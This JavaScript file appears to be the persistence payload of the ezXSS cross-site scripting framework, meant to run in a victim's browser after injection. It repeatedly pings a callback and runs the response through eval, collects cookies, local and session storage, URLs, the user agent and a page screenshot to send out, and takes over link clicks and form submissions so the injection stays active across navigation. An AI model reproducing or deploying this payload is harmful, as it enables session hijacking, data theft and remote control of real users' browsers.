var pi;
var last = '';

function ping() {
    try {
        ez_cb(JSON.stringify({ 'action': 'ping' }), 'ping', callback);
        pi = setTimeout(ping, 10000);
    } catch (e) {
        init()
    }
}

function callback(input) {
    eval(input);
}

function init() {
    // Ready to persist
    ra_hL();
    ez_cb(ez_rD);
}

function ez_persist() {
    init();
    ping();
}

function ra_client() {
    var name = "ezXSS=";
    var cookies = document.cookie.split(';');
    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i].trim();
        if (cookie.indexOf(name) == 0) {
            return cookie.substring(name.length, cookie.length);
        }
    }
    var value = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (var i = 0; i < 15; i++) {
        value += possible.charAt(Math.floor(Math.random() * possible.length));
    }
    var expires = new Date();
    expires.setFullYear(expires.getFullYear() + 1);
    document.cookie = name + value + ";expires=" + expires.toUTCString() + ";path=/";
    return value;
}

function ra_hL() {
    try {
        ez_rD.clientid = ra_client()
    } catch (e) {
        ez_rD.clientid = ""
    }
    try {
        ez_rD.method = "persist"
    } catch (e) {
        ez_rD.method = ""
    }
    try {
        ez_rD.uri = ez_n(location.toString())
    } catch (e) {
        ez_rD.uri = ""
    }
    try {
        ez_rD.cookies = ez_n(document.cookie)
    } catch (e) {
        ez_rD.cookies = ""
    }
    try {
        if(last != '') {
            ez_rD.referer = ez_n(last)
        } else {
            ez_rD.referer = ez_n(document.referrer)
        }
    } catch (e) {
        ez_rD.referer = ""
    }
    try {
        ez_rD["user-agent"] = ez_n(navigator.userAgent)
    } catch (e) {
        ez_rD["user-agent"] = ""
    }
    try {
        ez_rD.origin = ez_n(location.origin)
    } catch (e) {
        ez_rD.origin = ""
    }
    try {
        ez_rD.localstorage = ez_n(window.localStorage);
    } catch (e) {
        ez_rD.localstorage = "";
    }
    try {
        ez_rD.sessionstorage = ez_n(window.sessionStorage);
    } catch (e) {
        ez_rD.sessionstorage = "";
    }
    try {
        ez_rD.dom = ""; //ez_n(document.documentElement.outerHTML)
    } catch (e) {
        ez_rD.dom = ""
    }
    try {
        html2canvas(document.body).then(function (e) {
            ez_rD.screenshot = ez_n(e.toDataURL()), ra_c();
        });
    } catch (e) {
        ez_rD.screenshot = "", ra_c()
    }

    function ra_c() {
        ra_r()
    }
}

function ra_r() {
    document.querySelectorAll('a').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            let paths = e.path;
            var linkFound = false;
            for (path in paths) {
                for (subpath in path) {
                    if (paths[path].nodeName === 'A') {

                        console.log('A link with target URL ' + paths[path].href + ' was clicked');

                        if (paths[path].hostname === window.location.hostname) {
                            if (paths[path].href.slice(-1) === '#' && paths[path].hash === '') {
                                break;
                            }

                            // Same page click
                            if (paths[path].hash !== "" && paths[path].href.replace(paths[path].hash, '') === window.location.href.split('#')[0]) {
                                var hash = paths[path].hash.replace('#', '');
                                var top = document.getElementById(hash).offsetTop;
                                window.history.pushState("", document.title, paths[path].href);
                                window.scrollTo(0, top);
                                linkFound = true;
                                break;
                            }

                            // Page click on same domain
                            var request = new XMLHttpRequest();
                            request.onload = function () {
                                if (this.readyState == 4) {
                                    last = ez_n(location.toString());
                                    document.getElementsByTagName("html")[0].innerHTML = this.responseText;
                                    window.scrollTo(0, 0);
                                    let title = this.responseText.match(/<title[^>]*>([^<]+)<\/title>/)[1];
                                    document.title = title;
                                    window.history.pushState({ "html": this.responseText, "pageTitle": title }, "", paths[path].href);

                                    let scripts = Array.from(this.responseText.matchAll(/<script[^>]*src=[^>]*>[^>]*<\/script>/g));
                                    for (script in scripts) {
                                        try {
                                            var search = /<script[^>]+src="([^">]+)"/g;
                                            var src = search.exec(scripts[script][0])[1];
                                            var a = document.createElement('script');
                                            a.src = src;
                                            document.body.appendChild(a);
                                        } catch (e) { }
                                    }
                                    init();
                                }
                            };

                            request.onerror = function () {
                                window.open(paths[path].href, '_blank').focus();
                            };

                            request.open('GET', paths[path].href);
                            request.send();
                        } else {
                            // Click to other domain
                            window.open(paths[path].href, '_blank').focus();
                        }
                        linkFound = true;
                        break;
                    }
                }
                if (linkFound) break;
            }
        });
    });

    document.querySelectorAll("form").forEach(form => {
        form.addEventListener("submit", event => {
            event.preventDefault(); // prevent the form from redirecting or refreshing the page
            const formData = new FormData(form); // get all data from the form
            const xhr = new XMLHttpRequest();
            xhr.open("POST", form.action);
            xhr.onload = () => {
                if (xhr.status === 200) {
                    console.log('yes!');
                    document.documentElement.innerHTML = xhr.response;


                    console.log('done!');
                } else {
                    alert("An error occurred while processing the form.");
                }
            };
            xhr.send(formData);
        });
    });
}